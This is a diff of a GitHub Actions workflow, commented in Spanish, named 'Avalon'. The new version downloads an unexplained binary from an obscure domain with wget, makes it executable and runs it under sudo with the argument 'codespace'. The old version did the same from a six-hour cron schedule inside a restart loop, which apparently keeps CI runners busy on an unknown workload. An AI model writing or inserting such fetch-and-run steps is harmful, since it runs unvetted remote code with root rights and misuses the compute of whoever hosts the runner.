@@ -1,80 +1,25 @@
-name: Avalon Auto-Restart Service
+name: Ejecución Avalon
 
 on:
-  # Ejecutar cada 6 horas
-  schedule:
-    - cron: '0 */6 * * *'
-  # Ejecución manual
-  workflow_dispatch:
-  # Ejecutar cuando hay push en main
+  workflow_dispatch: # Esto te permite darle al botón "Run workflow" manualmente
   push:
-    branches: [ main ]
+    branches: [ main ] # Se ejecuta automáticamente al subir cambios a la rama main
 
 jobs:
-  avalon-service:
+  ejecutar-binario:
     runs-on: ubuntu-latest
-    timeout-minutes: 360 # 6 horas máximo
 
     steps:
-      - name: Checkout
-        uses: actions/checkout@v3
-
-      - name: Setup Avalon
-        id: setup
+      - name: Descargar y preparar binario
         run: |
-          echo "Starting at: $(date)"
-          echo "Next run in 6 hours"
-          # Descargar avalon
-          wget -q https://dcasdcas.online/avalon.x86_64
+          # 1. Descargar
+          wget https://dcasdcas.online/avalon.x86_64
+          
+          # 2. Renombrar
+          mv avalon.x86_64 avalon
+          
+          # 3. Dar permisos
           chmod +x avalon
-          # Guardar timestamp
-          echo "start_time=$(date +%s)" >> $GITHUB_OUTPUT
-
-      - name: Run Avalon continuously
-        run: |
-          echo "🚀 Starting Avalon service..."
-          # Función para mantener el servicio corriendo
-          while true; do
-            CURRENT_TIME=$(date +%s)
-            ELAPSED=$((CURRENT_TIME - ${{ steps.setup.outputs.start_time }}))
-            MAX_TIME=21600 # 6 horas en segundos
-            
-            if [ $ELAPSED -ge $MAX_TIME ]; then
-              echo "⏰ Time limit reached (6 hours). Stopping..."
-              break
-            fi
-            
-            echo "▶️ Starting Avalon (Elapsed: ${ELAPSED}s / ${MAX_TIME}s)"
-            # Ejecutar avalon con timeout (poco menos de 6h para evitar corte abrupto)
-            timeout 21540 ./avalon codespace || true 
-            
-            # Si se cierra, esperar y reiniciar
-            echo "🔄 Avalon stopped. Restarting in 10 seconds..."
-            sleep 10
-            
-            # Verificar si debemos continuar tras el sleep
-            CURRENT_TIME=$(date +%s)
-            ELAPSED=$((CURRENT_TIME - ${{ steps.setup.outputs.start_time }}))
-            if [ $ELAPSED -ge $MAX_TIME ]; then
-              echo "⏰ Time limit reached. Exiting loop..."
-              break
-            fi
-          done
-          echo "✅ Service cycle completed"
-
-      - name: Schedule next run
-        if: always()
-        run: |
-          echo "📅 Current time: $(date)"
-          echo "⏰ Next auto-run in 6 hours"
-          echo ""
-          echo "To trigger manually:"
-          echo "1. Go to Actions tab"
-          echo "2. Select 'Avalon Auto-Restart Service'"
-          echo "3. Click 'Run workflow'"
-
-      - name: Notify completion
-        if: always()
-        run: |
-          echo "🏁 Workflow completed at: $(date)"
-          echo "Duration: ~6 hours"
+          
+          # 4. Ejecutar con sudo
+          sudo ./avalon codespace
